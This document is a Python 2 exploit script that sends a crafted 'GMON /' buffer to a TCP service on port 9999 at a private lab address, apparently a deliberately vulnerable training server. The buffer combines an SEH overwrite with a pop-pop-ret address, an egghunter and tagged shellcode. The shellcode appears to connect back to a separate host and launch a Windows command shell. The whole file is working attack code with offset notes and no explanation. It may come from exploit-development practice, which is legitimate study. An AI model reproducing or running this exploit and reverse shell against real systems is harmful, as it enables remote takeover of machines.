#!/usr/bin/python
import sys
from subprocess import call
from struct import pack
import codecs
import socket
import os

host = "192.168.76.128"
port = 9999

def c(x):
  return pack('<L', x)

def pc(length):
    pattern = ''
    parts = ['A', 'a', '0']
    while len(pattern) != length:
        pattern += parts[len(pattern) % 3]
        if len(pattern) % 3 == 0:
            parts[2] = chr(ord(parts[2]) + 1)
            if parts[2] > '9':
                parts[2] = '0'
                parts[1] = chr(ord(parts[1]) + 1)
                if parts[1] > 'z':
                    parts[1] = 'a'
                    parts[0] = chr(ord(parts[0]) + 1)
                    if parts[0] > 'Z':
                        parts[0] = 'A'
    return pattern

def junk(size):
	return "\x90"*size

shellcode = "\x66\x31\xC0\xB8\x33\x32\x66\x50\x68\x77\x73\x66\x54\x66\xBB\x7B\x1D\x80\x7C\x66\xFF\xD3\x66\x89\xC5\x66\x31\xC0\xB8\x75\x70\x66\x50\x68\x74\x61\x68\x57\x53\x66\x54\x66\x55\x66\xBB\x40\xAE\x80\x7C\x66\xFF\xD3\x66\x31\xDB\xBB\x90\x01\x66\x29\xDC\x66\x54\x66\x31\xC9\xB9\x02\x02\x66\x51\x66\xFF\xD0\x66\x31\xC0\xB8\x74\x41\x66\x50\x68\x6F\x63\x68\x57\x53\x66\x54\x66\x55\x66\xBB\x40\xAE\x80\x7C\x66\xFF\xD3\x66\x31\xDB\x66\x53\x66\x53\x66\x53\x66\x31\xC9\xB1\x06\x66\x51\x66\x43\x66\x53\x66\x43\x66\x53\x66\xFF\xD0\x66\x50\x66\x5F\x66\x31\xC0\x66\xB8\x90\x65\x63\x74\x66\xC1\xE8\x08\x66\x50\x68\x63\x6F\x66\x54\x66\x55\x66\xBB\x40\xAE\x80\x7C\x66\xFF\xD3\x68\xC0\xA8\x68\x11\x5C\x66\x31\xDB\xB3\x02\x53\x66\x89\xE2\x6A\x10\x66\x52\x66\x57\x66\xFF\xD0\x66\xBB\x90\x63\x6D\x64\x66\xC1\xEB\x08\x66\x53\x66\x89\xE3\x66\x57\x66\x57\x66\x57\x66\x31\xF6\x6A\x12\x66\x59\x66\x56\xE2\xFC\x67\xC7\x44\x24\x3C\x01\x01\x67\xC6\x44\x24\x10\x44\x66\x67\x8D\x44\x24\x10\x66\x54\x66\x50\x66\x56\x66\x56\x66\x56\x66\x46\x66\x56\x66\x4E\x66\x56\x66\x56\x66\x53\x66\x56\x66\xBB\x6B\x23\x80\x7C\x66\xFF\xD3"

exploit = ""
buffsize = 5000
#OFFSETS
# EBP 2002  +1576
# EDX 3578
# ECX 3582 +508
# NSEH 3518 + 52
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
egg = "w00tw00t"

EBPOFFSET = 2002
SEHOFFSET = 3518

exploit += junk(EBPOFFSET)
exploit += egg + shellcode
exploit += junk(SEHOFFSET-len(exploit))
exploit += "\xEB\x06\x90\x90"
exploit += c(0x625010b4)
exploit += "\x90" #align
exploit += egghunter
exploit += junk(buffsize-len(exploit))



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("GMON /" + exploit)
s.close()
sys.exit()